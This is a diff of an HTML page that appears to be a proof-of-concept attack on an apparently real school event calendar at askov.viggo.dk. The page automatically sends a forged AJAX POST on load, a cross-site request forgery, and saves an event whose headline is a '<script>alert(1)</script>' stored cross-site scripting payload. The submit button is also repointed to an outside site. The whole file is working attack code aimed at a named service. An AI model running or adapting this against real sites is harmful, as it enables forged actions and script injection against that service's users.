@@ -1,4 +1,8 @@
-<form action="https://askov.viggo.dk/Shared/Events/SaveEvents" class="ajax" method="post">
+<head>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+
+<form action="https://askov.viggo.dk/Shared/Events/SaveEvents" class="ajax" method="post" id="ajaxform">
     <input id="CalendarId" name="CalendarId" type="hidden" value="0">
     <input type="hidden" name="IsPrivate" value="true">
     <input class="cursor-selected empty-value" id="Headline" name="Headline" tabindex="1" type="text" value="<script>alert(1)</script>">
@@ -9,8 +13,25 @@
     <input type="text" tabindex="5" readonly="" autocomplete="off" name="starttime" class="time" value="00:00">
     <input type="text" tabindex="4" readonly="" autocomplete="off" name="enddate" class="date" data-start="startdate" id="enddate" value="01-05-9999">
     <input type="text" tabindex="5" readonly="" autocomplete="off" name="endtime" class="time" value="00:00">
-    <button type="submit" id="submit"></button>
+    <button type="submit" id="submit" formaction="https://www.youbube.com"></button>
 </form>
+<div id="response"></div>
 <script>
-    document.getElementById("submit").click()
+    function submitForm() {
+            // Serialize form data
+            var formData = $("#ajaxform").serialize();
+            
+            // Send Ajax request
+            $.ajax({
+                type: "POST",
+                url: "https://askov.viggo.dk/Shared/Events/SaveEvents", // Replace with your server-side script URL
+                data: formData,
+                success: function(response) {
+                    // Display response from server
+                    $("#response").html(response);
+                }
+            });
+        }
+    submitForm()
+    //document.getElementById("submit").click()
 </script>
